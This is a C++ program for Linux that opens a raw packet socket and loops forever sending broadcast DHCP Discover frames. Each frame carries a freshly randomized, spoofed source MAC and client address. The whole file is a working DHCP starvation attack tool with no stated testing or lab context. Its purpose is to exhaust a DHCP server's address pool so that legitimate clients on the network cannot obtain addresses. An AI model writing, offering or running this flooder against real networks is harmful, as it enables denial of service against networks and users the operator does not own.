extern "C" {
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
}

#include <iostream>
#include <iomanip>
#include <vector>
#include <chrono>
#include <algorithm>
#include <string>
#include <functional>
#include <system_error>
#include <random>
#include <algorithm>

using namespace std;

using Mac_addr = array<uint8_t,6>;

struct UDP_header {
    uint16_t source_port;
    uint16_t destination_port;
    uint16_t length;
    uint16_t checksum;
} __attribute__((packed));

struct Dhcp_discover {
    uint8_t msg_type {0x35};
    uint8_t length {1};
    uint8_t dhcp_discover {1};
} __attribute__((packed));

struct Bootstrap {
    uint8_t msg_type {1};
    uint8_t hw_type {1};
    uint8_t hw_address_len {6};
    uint8_t hops {0};
    uint32_t transaction_id {};
    uint16_t seconds_elapsed {0};
    uint16_t bootp_flags {};
    uint32_t client_ip {0};
    uint32_t your_ip {0};
    uint32_t next_server_ip {0};
    uint32_t relay_agent_ip {0};
    Mac_addr client {{}};
    array<uint8_t, 10> padding {};
    array<uint8_t, 64> server_host_name {};
    array<uint8_t, 128> boot_file_name {};
    array<uint8_t, 4> magic_cookie {{0x63, 0x82, 0x53, 0x63}};

    Dhcp_discover dhcp_discover;
    uint8_t end {0xff};
} __attribute__((packed));

struct Ethernet_frame {
    Mac_addr destination;
    Mac_addr source;
    uint16_t ethertype; 
    ip iphdr;
    UDP_header udphdr;
    Bootstrap bootp_discover;
} __attribute__((packed));

vector<string> make_args(int argc, char* argv[]) {
    vector<string> args;
    for (int i {0}; i != argc; ++i) args.push_back(argv[i]);
    return args;
}

void check_args(const vector<string>& args) {
    if (args.size() != 3) throw runtime_error{"Usage: " + args[0] + " -i interface"};
    if (args[1] != "-i") throw runtime_error{"Invalid option used: " + args[1]};
}

int create_socket() {
    int socket {::socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)};
    if (socket == -1) throw system_error{errno, generic_category()};
    return socket;
}

int get_interface_index(int socket, const ifreq& ifr) {
    ifreq ifrcopy(ifr);
    if (ioctl(socket, SIOCGIFINDEX, &ifrcopy) == -1) throw system_error{errno, generic_category()};
    return ifrcopy.ifr_ifindex;
}

Mac_addr get_mac_address(int socket, const ifreq& ifr) {
    ifreq ifrcopy(ifr);
    if (ioctl(socket, SIOCGIFHWADDR, &ifrcopy) == -1) throw system_error{errno, generic_category()}; 

    const uint8_t* mac {reinterpret_cast<uint8_t*>(&ifrcopy.ifr_hwaddr.sa_data[0])};

    return {mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]};
}

uint32_t partial_checksum(const uint16_t* data, size_t words_count) {
	uint32_t sum {0};
	for (size_t i {0}; i < words_count; ++i) sum += data[i];
	return sum;
}

uint16_t ip_checksum(const uint16_t* data) {
	uint32_t sum {partial_checksum(data, sizeof(ip)/2)};
	sum += sum >> 16;
	return ~sum;
}

int main(int argc, char* argv[]) {
    vector<string> args {make_args(argc, argv)};
    check_args(args);

    const string interface {args.back()};

    ifreq ifr {};
    ifr.ifr_addr.sa_family = AF_INET;
    copy_n(interface.cbegin(), IFNAMSIZ-1, &ifr.ifr_name[0]);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';

    cout << "Interface: " << ifr.ifr_name << '\n';

    int socket {create_socket()};
    int idx {get_interface_index(socket, ifr)};
    Mac_addr mac(get_mac_address(socket, ifr));

    constexpr Mac_addr mac_broadcast {{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}};
    constexpr uint32_t ip_broadcast {0xffffffff};

    ip iphdr {};
    iphdr.ip_v = 0x4; // IPv4 type
    iphdr.ip_hl = 0x5; // 5*4 bytes header len
    iphdr.ip_tos = 0x10;
    iphdr.ip_len = htons(sizeof(iphdr) + sizeof(UDP_header) + sizeof(Bootstrap));
    iphdr.ip_id = 0x0000;
    iphdr.ip_off = 0x0000;
    iphdr.ip_ttl = 16;
    iphdr.ip_p = 17; // UDP protocol
    iphdr.ip_sum = 0;
    iphdr.ip_src.s_addr = 0;
    iphdr.ip_dst.s_addr = ip_broadcast;
    iphdr.ip_sum = ip_checksum((const uint16_t*)&iphdr);

    Bootstrap bootp_discover;
    bootp_discover.bootp_flags = htons(0x8000); // broadcast
    bootp_discover.transaction_id = htonl(123123123);

    UDP_header udp_hdr {};
	udp_hdr.source_port = htons(68);
	udp_hdr.destination_port = htons(67);
	size_t udp_len {sizeof(UDP_header) + sizeof(Bootstrap)};
	udp_hdr.length = htons(udp_len);
	udp_hdr.checksum = 0;

    Ethernet_frame frame {};
	frame.destination = mac_broadcast;
	frame.source = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
	frame.ethertype = htons(0x0800); // IPv4 type
	frame.iphdr = iphdr;
	frame.udphdr = udp_hdr;
	frame.bootp_discover = bootp_discover;
    
    // information where to connect to
    sockaddr_ll addr {};
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = idx;
    addr.sll_halen = ETHER_ADDR_LEN;
    addr.sll_protocol = htons(ETH_P_IP);
    copy(mac_broadcast.cbegin(), mac_broadcast.cend(), &addr.sll_addr[0]);

    // random number generator
    auto gen = std::bind(uniform_int_distribution<uint64_t>{}, mt19937_64{static_cast<mt19937_64::result_type>(chrono::system_clock::now().time_since_epoch().count())});

    cout << "Beginning of DHCP Discover packets generation...\n";
    for (;;) {
        uint64_t n {gen()};
        uint8_t* c {reinterpret_cast<uint8_t*>(&n)};
        
	// generate random mac address
        Mac_addr rand_mac {c[0], c[1], c[2], c[3], c[4], c[5]};

        frame.source = rand_mac;
        frame.bootp_discover.client = rand_mac;

        if (sendto(socket, &frame, sizeof(frame), 0, (sockaddr*)&addr, sizeof(addr)) == -1) throw system_error{errno, generic_category()};
    }

    close(socket);
}
